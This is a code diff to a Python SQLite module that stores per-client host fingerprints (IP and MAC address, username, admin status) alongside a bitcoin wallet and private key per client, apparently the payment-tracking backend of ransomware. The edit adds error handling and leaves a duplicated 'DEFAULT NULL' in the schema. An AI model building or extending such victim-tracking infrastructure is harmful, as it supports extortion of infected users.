@@ -25,7 +25,7 @@ def create_tables():
     logger.info("Creating tables")
     connection = create_connection()
     cursor = connection.cursor()
-    statistics_table = """CREATE TABLE IF NOT EXISTS `statistics` (`client_id` VARCHAR(100) NOT NULL,`platform` VARCHAR(75) DEFAULT NULL,`architecture` VARCHAR(75) DEFAULT NULL,`ip_address` VARCHAR(75) DEFAULT NULL,`mac_address` VARCHAR(75) DEFAULT NULL,`device_name` VARCHAR(75) DEFAULT NULL,`username` VARCHAR(75) DEFAULT NULL,`is_admin` BOOLEAN DEFAULT NULL,`location` VARCHAR(150) DEFAULT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`));"""
+    statistics_table = """CREATE TABLE IF NOT EXISTS `statistics` (`client_id` VARCHAR(100) NOT NULL,`platform` VARCHAR(75) DEFAULT NULL,`architecture` VARCHAR(75) DEFAULT NULL,`ip_address` VARCHAR(75) DEFAULT NULL,`mac_address` VARCHAR(75) DEFAULT NULL,`device_name` VARCHAR(75) DEFAULT NULL,`username` VARCHAR(75) DEFAULT NULL,`is_admin` BOOLEAN DEFAULT NULL DEFAULT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`));"""
     cursor.execute(statistics_table)
     bitcoin_details = """CREATE TABLE IF NOT EXISTS `bitcoin_details` (`client_id` VARCHAR(100) NOT NULL,`wallet_address` VARCHAR(1000) NOT NULL,`public_key` VARCHAR(1000) NOT NULL,`wif_private_key` VARCHAR(1000) NOT NULL, `created_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP, PRIMARY KEY (`client_id`,`wallet_address`));"""
     cursor.execute(bitcoin_details)
@@ -47,13 +47,16 @@ def insert_statistics_to_database(statistics):
         sqlite3.ProgrammingError: Exception raised for programming errors, e.g. table not found or already exists, syntax error in the SQL statement, wrong number of parameters specified, etc.
         sqlite3.OperationalError: Exception raised for errors that are related to the database’s operation.
     """    
-    logger.info("Inserting statistics into database")
-    connection = create_connection()
-    cursor = connection.cursor()
-    statistics_insert_query = "INSERT INTO `statistics` (client_id, platform, architecture, ip_address, mac_address, device_name, username, is_admin, location) VALUES (:client_id, :platform, :architecture, :ip_address, :mac_address, :device_name, :username, :is_admin, :location);"
-    cursor.execute(statistics_insert_query, statistics)
-    connection.commit()
-    connection.close()
+    try:
+        logger.info("Inserting statistics into database")
+        connection = create_connection()
+        cursor = connection.cursor()
+        statistics_insert_query = "INSERT INTO `statistics` (client_id, platform, architecture, ip_address, mac_address, device_name, username, is_admin) VALUES (:client_id, :platform, :architecture, :ip_address, :mac_address, :device_name, :username, :is_admin);"
+        cursor.execute(statistics_insert_query, statistics)
+        connection.commit()
+        connection.close()
+    except sqlite3.IntegrityError as err:
+        logger.error(f"{err}: Client ID already present")
     
 
 def insert_bitcoin_details_to_database(client_id, wallet_address, wif_encoded_private_key, public_key):
@@ -100,9 +103,10 @@ def get_bitcoin_wallet_id_database(client_id):
     cursor = connection.cursor()
     wallet_query = "SELECT wallet_address FROM `bitcoin_details` where client_id = ?;"
     result = cursor.execute(wallet_query, [client_id])
-    id = result.fetchone()[0]
-    connection.close()
-    return id
+    id = result.fetchone()
+    if id is not None:
+        connection.close()
+        return id[0]
 
 
 def insert_payment_details_into_database(client_id, payee_wallet_address):
